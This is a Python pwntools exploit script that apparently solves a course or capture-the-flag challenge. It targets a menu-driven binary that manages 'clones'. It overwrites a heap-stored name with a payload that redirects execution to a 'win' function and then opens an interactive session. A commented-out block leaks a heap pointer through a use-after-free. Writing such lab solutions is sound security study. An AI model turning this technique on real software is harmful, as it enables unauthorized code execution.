#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 8001

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    # with context.local(log_level='error'):
    if args.REMOTE:
        P = remote(HOST, PORT)
    elif args.GDB:
        P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
    else:
        P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
############## Exploit ###############
######################################

def runner(send):
    P.recvuntil(b'Choice: ', drop=True)
    if(send in ['a', 'b', 'c', 'd', 'h', 'q']):
        P.sendline(send.encode())

def make_clone(id, name):
    runner('a')
    P.recvuntil(b'Clone ID: ', drop=True)
    P.sendline(str(id).encode())
    P.recvuntil(b'): ', drop=True)
    P.sendline(name)

def kill_clone(id):
    runner('b')
    P.recvuntil(b'Clone ID: ', drop=True)
    P.sendline(str(id).encode())

def name_clone(id, name):
    runner('c')
    P.recvuntil(b'Clone ID: ', drop=True)
    P.sendline(str(id).encode())
    P.recvuntil(b"Name: ", drop=True)
    P.sendline(name)

def view_clone(id):
    runner('d')
    P.recvuntil(b'Clone ID: ', drop=True)
    P.sendline(str(id).encode())
    P.recvuntil(b'Name: ', drop=True)
    leak = P.recvline()
    leak = leak[0:4]
    return leak

def give_hint(id):
    runner('h')
    P.recvuntil(b'Clone ID: ', drop=True)
    P.sendline(str(id).encode())

def leave():
    P.sendline()
    runner('q')

# make_clone(1, b'')
# kill_clone(0) # free clone 0
# kill_clone(1) # free clone 1
# leak = view_clone(1)
# log.info(f"Leaked Forward Pointer: {hex(u32(leak))}")
# leak = u32(leak) + 0x10
# log.info(f"Hint Pointer: {hex(leak)}")
# make_clone(2, b'') # make clone 1
# make_clone(3, b'')
# make_clone(3, p32(E.symbols['win']))

def exploit():
    make_clone(0, b'')
    payload = b'A'*8 + p64(E.symbols['win'])
    name_clone(0, payload)
    P.sendline()
    give_hint(0)
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
